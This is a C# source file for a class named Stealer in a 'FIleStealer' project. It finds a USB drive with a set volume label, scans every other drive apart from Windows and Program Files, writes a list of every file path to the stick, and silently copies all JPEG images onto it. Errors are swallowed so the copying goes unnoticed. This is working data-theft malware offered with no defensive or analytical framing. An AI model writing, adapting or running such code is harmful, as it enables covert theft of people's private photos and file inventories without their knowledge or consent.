using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FIleStealer.Model
{
    public class Stealer
    {
        private static bool success = false;
        private static string tom;
        private static string tomVolumeLabel = "CPRA_X64FRE";
        private static string catalog;
        private static ulong count;
        private static StreamWriter streamWriter;

        public void Steal()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo d in drives)
            {
                if (d.IsReady && d.VolumeLabel == tomVolumeLabel)
                {
                    tom = d.Name;
                    if (!Directory.Exists(@tom + "Documents")) Directory.CreateDirectory(@tom + "Documents");
                    streamWriter = new StreamWriter(@tom + "Files.txt", false, System.Text.Encoding.Default);
                    foreach (DriveInfo drive in drives)
                    {
                        try
                        {
                            if (drive.IsReady && drive.Name != tom)
                            {
                                //log information
                                /*"Drive " + drive.Name + " is checking\n";
                                "About drive:\n\tDrive Format: " + drive.DriveFormat + "\n\tDrive Type: " + drive.DriveType + "\n\tTotal Size: " + drive.TotalSize);
                                */
                                Search(drive.Name);
                                //("Drive " + drive.Name + " is checked. Found " + count + " files");
                                count = 0;
                            }
                            //("Drive " + drive.Name + " is skiped. \nAbout drive:\n\tDrive Format: " + drive.DriveFormat + "\n\tDrive Type: " + drive.DriveType + "\n\tTotal Size: " + drive.TotalSize + "\n\tDrive status: " + (drive.IsReady ? "Ready" : "Isn't Ready"));
                        }
                        catch (System.IO.IOException) { }
                        catch (System.NullReferenceException) { }
                    }
                    success = true;
                }

            }

            //if (!success) //"Flash card isn't found. Please insert it and try again.");
            try
            {
                streamWriter.Close();
            }
            catch (System.NullReferenceException) { }
            catch (System.IO.IOException) { }; //"Out of memory... "
        }

        private void Search(string path)
        {
            bool b = true;
            if (path.Contains("Program Files") || path.Contains("Windows") || path.Contains("Program Files (x86)")) b = false;
            if (b)
            {
                string[] directories = Directory.GetDirectories(path);
                foreach (string dir in directories)
                {
                    try
                    {
                        //string[] files = Directory.GetFiles(dir, "*.jpg", SearchOption.AllDirectories);
                        string[] files = Directory.GetFiles(dir);
                        foreach (string f in files)
                        {
                            streamWriter.WriteLine(f);
                            count++;
                            FileInfo file = new FileInfo(f);
                            if (file.Extension == ".jpg" || file.Extension == ".jpeg")
                            {
                                try
                                {
                                    catalog = @tom + "Documents\\" + dir.Substring(3) + "\\";
                                    if (!Directory.Exists(catalog)) Directory.CreateDirectory(catalog);
                                    file.CopyTo(catalog + file.Name, false);
                                }
                                catch (System.IO.IOException) { }
                            }
                        }
                        Search(dir);
                    }
                    catch (System.UnauthorizedAccessException) { }
                }
            }
        }
    }
}
